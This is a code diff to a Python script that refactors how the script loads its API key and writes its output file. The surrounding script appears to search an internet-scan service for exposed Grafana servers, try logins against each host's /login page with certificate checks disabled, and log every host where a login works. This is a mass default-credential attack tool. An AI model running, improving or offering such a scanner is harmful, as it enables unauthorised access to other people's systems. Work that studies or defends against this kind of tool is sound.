@@ -13,7 +13,13 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "YOURAPIKEY"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = 'title:"Grafana" port:"443"'
 
 session = requests.Session()
@@ -29,7 +35,7 @@ def login (IP,PORT,CC):
 		response = session.post(""+http_type+"://"+IP+":"+PORT+"/login", data=rawBody, headers=headers, verify=False)
 		if response.status_code == 200:
 			print ("[*]Found Working Login ... Logging to file.[*]")
-			text_file = open("./cfg/default.txt", "a")
+			text_file = open_output("cfg/default.txt", "a")
 			text_file.write(""+http_type+"://"+IP+":"+PORT+"/login\n")
 			text_file.close()
 		else:
